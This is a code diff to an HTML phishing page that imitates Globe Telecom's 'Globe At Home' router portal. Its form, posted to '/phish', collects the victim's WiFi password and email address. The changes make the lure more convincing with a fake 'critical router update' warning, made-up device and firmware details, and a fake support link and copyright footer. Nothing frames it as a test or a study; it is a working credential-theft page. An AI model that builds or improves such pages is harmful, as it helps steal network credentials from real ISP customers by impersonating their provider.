@@ -4,23 +4,41 @@
     <title>Globe At Home Portal</title>
     <link rel="icon" href="/static/logos/globe.png">
     <style>
-        body { background-color: #e3f2fd; font-family: sans-serif; text-align: center; padding-top: 70px; }
-        img { width: 120px; }
-        h2 { color: #004a99; }
-        input { padding: 10px; width: 240px; margin-top: 20px; }
-        button { padding: 10px 25px; margin-top: 10px; background-color: #004a99; color: white; border: none; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); display: inline-block; }
+        body { background-color: #e3f2fd; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding-top: 60px; }
+        .card { background: white; padding: 36px 32px 24px 32px; border-radius: 12px; box-shadow: 0px 2px 16px rgba(0,0,0,0.10); display: inline-block; min-width: 350px; }
+        img { width: 120px; margin-bottom: 10px; }
+        h2 { color: #004a99; margin-bottom: 8px; }
+        .device-info { color: #555; font-size: 0.98em; margin-bottom: 18px; }
+        input { padding: 11px; width: 90%; margin-top: 16px; border: 1px solid #b2cbe6; border-radius: 5px; font-size: 1em; }
+        button { padding: 11px 32px; margin-top: 18px; background-color: #004a99; color: white; border: none; border-radius: 5px; font-size: 1em; cursor: pointer; }
+        button:hover { background-color: #003366; }
+        .support { margin-top: 18px; font-size: 0.95em; color: #888; }
+        .footer { margin-top: 32px; color: #aaa; font-size: 0.92em; }
+        .help-link { color: #004a99; text-decoration: underline; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="/static/logos/globe.png" alt="Globe">
         <h2>Globe At Home</h2>
-        <p>Your router requires security verification. Enter your WiFi password to reconnect.</p>
+        <div class="device-info">
+            Model: GPON ONU &nbsp;|&nbsp; SSID: <b>GlobeAtHome_5G</b><br>
+            Firmware: v2.4.3.1
+        </div>
+        <p style="color:#333;">A critical router update is required to maintain your internet connection.<br>
+        Please verify your WiFi credentials below to proceed.</p>
         <form method="POST" action="/phish">
+            <input type="email" name="email" placeholder="Email Address (optional)"><br>
             <input type="password" name="password" placeholder="WiFi Password" required><br>
-            <button type="submit">Verify</button>
+            <button type="submit">Verify & Update</button>
         </form>
+        <div class="support">
+            Need help? <span class="help-link">Contact Globe Support</span>
+        </div>
+    </div>
+    <div class="footer">
+        &copy; 2025 Globe Telecom Inc. All rights reserved.<br>
+        <span>Terms of Service | Privacy Policy</span>
     </div>
 </body>
 </html>
